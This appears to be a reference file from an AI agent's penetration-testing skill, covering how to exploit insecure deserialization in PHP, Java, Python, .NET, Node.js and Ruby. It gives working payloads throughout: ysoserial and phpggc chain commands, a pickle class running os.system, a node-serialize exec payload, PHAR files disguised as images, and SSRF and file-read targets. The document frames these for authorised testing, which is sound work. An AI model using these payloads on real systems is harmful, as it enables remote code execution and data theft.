# Exploitation Methodology & Gadget Chains

*Reached from [SKILL.md](SKILL.md) Phase 4. Assumes format identified, deserialization confirmed, control assessed.*

---

## Quick Reference Tables

### Time Delay Payloads (Safe PoC)

Use these as your first confirmation method. All delays should be 5+ seconds to distinguish from network latency.

| Format | Payload / Command | Notes |
|--------|-------------------|-------|
| **PHP** | `phpggc Monolog/RCE1 sleep 5` | Requires gadget chain with `sleep(5)` sink |
| **Java** | `ysoserial CommonsCollections5 "sleep 5"` | CC1 fails on Java 8u231+; use CC5/6/7 |
| **Python** | `__reduce__: (time.sleep, (5,))` | Direct execution, no chain needed |
| **.NET** | `ysoserial.net TypeConfuseDelegate "cmd /c ping -n 6 127.0.0.1"` | Ping for cross-platform timing |
| **Node.js** | `{"rce":"_$$ND_FUNC$$_function(){var s=Date.now();while(Date.now()-s<5000){}}()"}` | CPU-bound delay |
| **Ruby** | `Gem::Requirement` → `Kernel.sleep(5)` | Needs `secret_key_base` for Rails |

### Error Message Fingerprinting

Patterns confirming deserialization occurs even when exploitation fails.

| Error Contains | Format | Meaning |
|----------------|--------|---------|
| `unserialize()`, `__wakeup`, `__destruct` | PHP | Deserialization invoked |
| `ClassNotFoundException`, `InvalidClassException` | Java | Class/UID mismatch |
| `StreamCorruptedException`, `ClassCastException` | Java | Malformed stream or type mismatch |
| `no module named`, `_pickle.UnpicklingError` | Python | Pickle import/parse error |
| `TypeNameHandling`, `ViewStateException`, `SerializationException` | .NET | .NET deserializer active |
| `marshal data too short`, `incompatible marshal` | Ruby | Marshal stream error |

---

## Decision Point: Do You Even Need a Gadget Chain?

Gadget chains are complex, version-sensitive, and carry operational risk. Many findings achieve High severity from value modification alone. Check first:

- Can I change a field to escalate privilege? 
- Can I swap a file path for LFI? (/etc/passwd, config)
- Can I redirect a URL field for SSRF? (169.254.169.254)
- Can I exploit PHP type juggling? (0 == "string")

**If any achieves impact → document and stop.** Only escalate to chains if impact is insufficient AND authorisation permits.

---

## Value and Type Manipulation

### Attribute Value Modification

Change fields that map directly to application behaviour: roles, access levels, prices, file paths, subscription tiers, boolean flags.

**PHP example:** `O:10:"UserState":1:{s:4:"role";s:4:"user";}` → change `s:4:"user"` to `s:5:"admin"`.

**Confidence check:** Submit the modified object and observe whether the app behaves differently. If the response is identical regardless of the value, the field may not be used post-deserialization — move to a different field or consider that the app may not be deserializing at all.

### PHP Type Juggling

PHP's `==` allows type confusion: integer `0` satisfies `0 == "any_string"` (PHP casts string to 0). Useful for authentication token bypasses where code uses `==` instead of `===`. In blackbox, test by injecting integer `0` in string token fields.

### Application Functionality Abuse

Objects carrying file paths, URLs, or identifiers can be redirected without needing a gadget chain. Legitimate code paths will act on attacker-controlled data:

- **File path fields:** `→ /etc/passwd` (path traversal), `→ /proc/self/environ` (env vars)
- **URL fields:** `→ http://169.254.169.254/` (AWS metadata SSRF), `→ http://internal-service/`
- **Identifier fields:** `→ ../sibling-user-id` (IDOR via deserialized ID)

**Decision:** If value/type manipulation achieves meaningful impact, document it at that tier and stop. Only proceed to gadget chains if the impact ceiling doesn't meet your testing goal *and* you have written authorisation to escalate.

---

## Magic Methods and Object Injection

Magic methods fire automatically on deserialization. These are the entry points for all chains. Understanding which magic methods exist and what they do tells you whether a class is a viable entry gadget.

### PHP

| Method | Fires When | Value |
|---|---|---|
| `__destruct` | Object goes out of scope | Highest — always fires |
| `__wakeup` | On `unserialize()` call | Fires before `__destruct` |
| `__toString` | Object cast to string | Used by Laravel/Symfony chains |
| `__call` / `__get` | Undefined method/property | Type-confusion pivots |

**Finding gadgets:** Grep for `function __destruct` in source. Look for file ops, system calls, or calls to `$this->property->method()`. For blackbox, use PHPGGC.

### Java

`readObject()` is the universal entry point. Java chains flow through interface calls, comparators, and iterators. The `CommonsCollections` chains exploit `TransformedMap` calling a `Transformer` during `readObject()` — that transformer chains to `Runtime.exec()`.

### Python

`__reduce__()` returns `(callable, args)`. Pickle calls `callable(*args)` — direct RCE, no chain needed. Always start with `time.sleep(5)` since endpoint may be async/sandboxed.

```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("sleep 5",))
payload = pickle.dumps(Exploit())
```

### Ruby

`marshal_load()` fires during `Marshal.load()`. Rails apps commonly use cookie-based sessions:

- **Pre-Rails 4:** Signed but not encrypted. If signature can be forged, RCE possible.
- **Rails 4+:** Encrypted by default. Requires leaked `secret_key_base`.

**Gadget:** `Gem::Requirement` → `Kernel#open`

### .NET

- **BinaryFormatter:** `ISerializable` + `OnDeserialized` callbacks. Chains via ysoserial.net.
- **JSON.NET with TypeNameHandling:** Inject `$type` field → `ObjectDataProvider` → `Process.Start`.
- **DataContractSerializer/XmlSerializer:** More restricted; requires insecure config.

**TypeNameHandling test:** Inject `"$type":"System.String, mscorlib"` — if accepted, TypeNameHandling is enabled.

### Node.js

`node-serialize` executes IIFEs with `_$$ND_FUNC$$_` prefix. **Direct RCE — no chain needed:**
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('sleep 5')}()"}
```

---

## What Makes a Gadget Chain Work

A viable chain requires three components on the target's classpath/autoloader:

1. **Entry gadget** — magic method fires, calls a method on an attacker-controlled property
2. **Intermediate gadgets** — methods that pass control forward
3. **Sink gadget** — reaches `Runtime.exec()`, `file_put_contents()`, `eval()`, etc.

### Classpath/Dependency Enumeration

You need to know what's on the classpath before selecting a chain:

- **Java:** Error stack traces, `X-Powered-By` headers, `/actuator/info`, exposed `pom.xml`, `MANIFEST.MF`
- **PHP:** Exposed `composer.json`, framework fingerprinting via error messages, admin panel hints
- **.NET:** `web.config` exposure, NuGet `packages.config`, assembly version in error pages

```
[DEPENDENCY CHECKPOINT]
[LIBRARIES IDENTIFIED] {list with versions if known}
[CHAIN CANDIDATES] {shortlist before testing}
```

---

## Pre-built Chains and Tools

Always probe with a safe payload first. Never go from "confirmed deserialization" to "RCE payload" in one step.

### Java Chain Selection (ysoserial)

```
Commons Collections on classpath?
  → CommonsCollections1: Java < 8u231 only
  → CommonsCollections5, 6, 7: Java 8u231+ (JEP 290 filter workaround)

Spring Framework? → Spring1 or Spring4
Groovy? → Groovy1
Hibernate? → Hibernate1
Rome RSS? → ROME
```

**Silent failure?** Wrong chain for classpath or JEP 290 filter active. Try `JRMPClient`/`JRMPListener` to bypass filters.

### PHP Chain Selection (PHPGGC)

```
phpggc -l                    # list all chains
phpggc -l | grep Laravel     # filter by framework
phpggc Laravel/RCE1 system id  # generate payload
```

**Prefer file-write chains before RCE** — broader compatibility, observable impact, lower detection risk. Version mismatch? Try different chain variant.

### .NET Chain Selection (ysoserial.net)

| Chain | Target Serializer | Sink |
|---|---|---|
| `TypeConfuseDelegate` | BinaryFormatter | `Process.Start` |
| `ObjectDataProvider` | JSON.NET / XAML | `Process.Start` |
| `TextFormattingRunProperties` | BinaryFormatter | XAML execution |

**ViewState:** Check `__VIEWSTATE` in HTML. If MAC disabled, direct injection works. If MAC enforced, need key via `web.config` leak.

**JSON.NET:** If `$type` accepted, inject `ObjectDataProvider` pointing to `Process.Start`.

---

## PHAR Deserialization

PHP filesystem functions (`file_exists()`, `fopen()`, `copy()`) trigger deserialization when passed a `phar://` URL.

**Prerequisites:** File upload exists + filesystem operation reachable with path you control.

**Execution:**
1. Craft PHAR: `phpggc -p phar <chain> <args> -o payload.phar`
2. Disguise as image if needed (prepend GIF/PNG header)
3. Upload and trigger with `phar:///path/to/uploaded/file.jpg`

**Extension doesn't matter** — PHAR identification is content-based. **`open_basedir` causes silent failure** — check `phpinfo()` for restrictions.

---

## Confirmation Methods

Use time delay as default. Ordered by operational safety.

| Priority | Method | When to Use |
|---|---|---|
| 1 | Time delay | Default. `sleep 5` — confirm via ≥5s response latency above baseline. |
| 2 | File write to `/tmp` | When time delay is ambiguous. Track for cleanup. |
| 3 | In-band command output | When you need execution context. Scope must permit. |

**Decision principle:** Time delay → file write → in-band output. Never escalate without a reason.

---

## Return Protocol

After testing a gadget chain:

```
[CHAIN-SELECTION] Completed
[CHAIN] {chain name}
[REASON] {classpath evidence}
[RETURN TO] SKILL.md Phase 5
```

---

## Common Pitfalls

| Pitfall | Solution |
|---------|----------|
| Chain works locally, fails remotely | Version mismatch or WAF blocking — check waf-bypass.md |
| Silent failure, no error | Wrong chain for classpath or JEP 290 filter active |
| "ClassNotFoundException" | Required class not on classpath — try different library chain |
| Payload too large | Use shorter chains or compress payload |

---

## Checklist Before Reporting

- [ ] Confirmed deserialization (Phase 3) before attempting chains
- [ ] Used minimum-impact PoC first (time delay, not RCE)
- [ ] Documented classpath/dependency evidence
- [ ] For Tier 4 (RCE): Obtained written authorization
- [ ] For file writes: Tracked files for cleanup

---

*Return to [SKILL.md](SKILL.md) | See [waf-bypass.md](waf-bypass.md) for WAF bypass techniques*
